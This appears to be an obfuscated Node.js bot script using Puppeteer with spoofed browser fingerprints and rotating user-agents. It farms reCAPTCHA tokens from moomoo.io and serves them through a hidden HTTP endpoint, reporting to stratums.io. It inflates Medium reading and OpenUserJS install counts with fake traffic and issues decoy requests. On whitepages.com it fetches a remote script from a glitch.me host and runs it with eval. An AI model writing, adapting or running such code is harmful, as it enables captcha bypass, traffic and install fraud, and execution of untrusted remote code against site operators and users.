      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + W(0x15) + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + W(0xe) + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    Y(0x8, 'g@qu') + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + X(0x11) + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    X(0x4) + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + Y(0x1b, '3XmA') + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => -0xb69 * 0x1 + 0x18af + -0xd46
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    const Z = d;
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require(Z(0x1) + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0xed3 + 0x1 * -0x11c5 + -0x1 * -0x2f2)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log(Z(0x1f) + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0x175c + -0x1 * -0xddc + -0x24d4), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0x10d7 + 0xe66 + -0x35 * 0x95), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0xf36 + -0x1 * 0x1ab0 + 0xb7a;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0x11dd + -0x2276 + 0x3453; w < getRandomInt(-0x1745 + 0x1590 + 0x1b6, 0x1cc5 + 0xa24 + 0x83 * -0x4c); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(0xc9a7 * -0x1 + -0x1a403 + 0x3580a);
        }
      }();
    }, 0x119b + 0x51b + -0x1652), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = -0x4f * 0x61 + 0x4b3 + 0x5 * 0x50c;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](0x10b + -0xd29 + 0x6 * 0x205, -0x24b8 + -0x2338 + -0x4822 * -0x1)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0x34a7 + -0x15 * 0x561 + 0xb17e);
    }, 0x11d2 + -0x1912 + 0x2 * 0x3d2), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = 0x1bc4 * -0x1 + 0x160f + 0x5b5;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0x14d4 + -0x9 * -0x25c + 0x16a * 0x8), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0x1d3 + -0xe27 * 0x2 + -0x1 * -0x1a7b), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(-0x1337b0 + -0x10b248 + 0x1 * 0x31a598);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, 0x25 * 0x3d + 0x1fc0 + -0x282d);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const a0 = b,
      i = url['parse'](f['url'])['pathname'];
    h['writeHead'](-0x477 + -0x99 * -0x9 + -0x22);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write'](a0(0x17, 'U54^')), h['end']();
  });
  e[W(0x1a)](process['env']['PORT'] || 0x105a + -0x19a9 * 0x2 + 0x1 * 0x4288);
}
doFlags['doOUJS'] && ((async () => {
  const a2 = d;
  async function f() {
    const a1 = d,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = 0x1f77 + 0x1 * 0x6cd + -0x2643) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (0x76 * 0x2e + 0x1da * 0x2 + -0x18e7));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0x551 + 0x269c + -0x214b, D['indexOf']('\x20'));
        return B ? E['slice'](-0x19fa + 0x4f2 + 0x8 * 0x2a1, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0x3 * -0x125 + -0x1 * 0x40d0 + 0x6471),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal[a1(0x18)](-0x2ae9 + -0x411e + 0x1d6b * 0x5),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + a2(0x12) + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = 0xae * 0x12 + 0x1 * -0x1654 + 0xa18; k < -0x1a1 * -0xe + -0x2483 * 0x1 + 0x1 * 0xdb9; k++)
    setTimeout(f, (0x738 * 0x1d + 0x3bcb * -0x6 + 0xccb * 0x1e) * k * getRandomInt(0x10bf * -0x2 + -0x1 * -0x86d + 0x1912, -0xeca + -0x502 + 0x13cf * 0x1));
  setInterval(() => {
    f();
    for (let l = -0xf9b * 0x1 + -0x5a * 0x2 + 0x104f; l < -0x131d + 0x2466 + -0x1145 * 0x1; l++)
      setTimeout(f, (0x5c79 + 0xa740 + -0x7 * 0x39f) * l * getRandomInt(0x15bd + -0x6cd + -0xeef, 0x10c6 + 0x1 * 0x1231 + 0x1 * -0x22f4));
  }, 0x256efb + -0x6be * -0x8e1 + -0x2a5d79);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (0x24f2 + -0x3089 * -0x1 + -0x3a23) * getRandomInt(-0xa19 + 0x185d + -0xe43, 0x4e7 + 0x117 * 0x14 + -0x1aae));
